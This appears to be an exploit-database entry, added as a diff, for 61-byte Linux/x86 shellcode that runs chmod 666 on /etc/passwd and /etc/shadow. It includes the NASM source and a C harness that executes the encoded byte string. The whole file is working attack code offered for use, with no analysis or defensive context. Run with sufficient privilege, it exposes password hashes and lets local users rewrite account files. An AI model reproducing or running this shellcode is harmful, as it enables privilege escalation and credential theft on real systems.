@@ -1,0 +1,64 @@
+# Exploit Title: Linux/x86 - chmod 666 /etc/passwd & chmod 666 /etc/shadow (61 bytes)
+# Date: 10/07/2019
+# Exploit Author: Xavier Invers Fornells
+# Contact: x4v1s3c@gmail.com	
+# Tested on: Debian 4.19.28
+# Architecture: x86
+# Size: 61 bytes
+
+
+
+#################################### chmod.nasm ####################################
+
+global _start
+section .text
+
+_start:
+	push byte 15		
+	pop eax			
+	push byte 0x64		
+	push word 0x7773	
+	push 0x7361702f		
+	push 0x6374652f		
+	mov ebx, esp
+	
+	push word 0x1b6	
+	pop ecx		
+	
+	int 0x80		
+
+	push byte 15
+	pop eax		
+	push byte 0x77
+	push word 0x6f64
+	push 0x6168732f
+	push 0x6374652f
+	mov ebx, esp
+
+	push word 0x1b6
+	pop ecx
+
+	int 0x80
+
+	push byte 1
+	pop eax
+	int 0x80
+
+#################################### shellcode.c ####################################
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x6a\x0f\x58\x6a\x64\x66\x68\x73\x77\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\x6a\x0f\x58\x6a\x77\x66\x68\x64\x6f\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80";
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
